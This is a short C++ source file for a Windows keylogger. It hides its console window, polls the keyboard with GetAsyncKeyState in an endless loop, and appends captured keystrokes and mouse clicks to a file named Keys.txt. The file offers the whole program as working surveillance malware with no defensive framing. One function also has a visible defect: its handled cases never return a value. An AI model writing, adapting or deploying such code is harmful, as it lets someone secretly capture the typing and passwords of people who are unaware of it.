#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text)
{
    ofstream logFile;
    logFile.open("Keys.txt", fstream::app);
    logFile << text;
    logFile.close();
}

bool KeyInList(int iKey)
{
    switch (iKey)
    {
        case VK_SPACE:
            cout << " ";
            WriteToLog(" ");
            break;
        case VK_RETURN:
            cout << "\n";
            WriteToLog("\n");
            break;
        case VK_SHIFT:
            cout << "*SHIFT*";
            WriteToLog("*SHIFT*");
            break;
        case VK_BACK:
            cout << "*BACKSPACE*";
            WriteToLog("*BACKSPACE*");
            break;
        case VK_RBUTTON:
            cout << "*RCLICK*";
            WriteToLog("*RCLICK*");
            break;
        case VK_LBUTTON:
            cout << "*LCLICK*";
            WriteToLog("*LCLICK*");
            break;
        default: return false;
    }
}

int main()
{
    char key;
    HWND Console;
    while (TRUE)
    {
        Console = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Console, 0);
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (KeyInList(key) == FALSE)
                {
                    ofstream logFile;
                    logFile.open("Keys.txt", fstream::app);
                    logFile << key;
                    logFile.close();
                }
            }
        }
    }
    return 0;
}